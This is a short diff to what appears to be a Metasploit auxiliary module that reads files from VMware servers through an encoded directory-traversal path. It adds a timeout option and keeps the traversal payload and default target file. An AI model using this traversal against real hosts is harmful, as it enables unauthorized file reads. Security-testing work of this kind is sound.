@@ -36,9 +36,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8222),
-        OptString.new('FILE', [ true,  "The file to view", '/etc/vmware/hostd/vmInventory.xml']),
-        OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E']),
+        OptString.new('FILE', [ true,  "The file to view", '/etc/vmware/hostd/vmInventory.xml' ]),
+        OptString.new('TRAV', [ true,  "Traversal Depth", '/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E' ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run_host(target_host)
@@ -50,7 +55,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'          => trav+file,
         'version'      => '1.1',
         'method'       => 'GET'
-      }, 25)
+      }, timeout)
 
       if res.nil?
         print_error("Connection timed out")
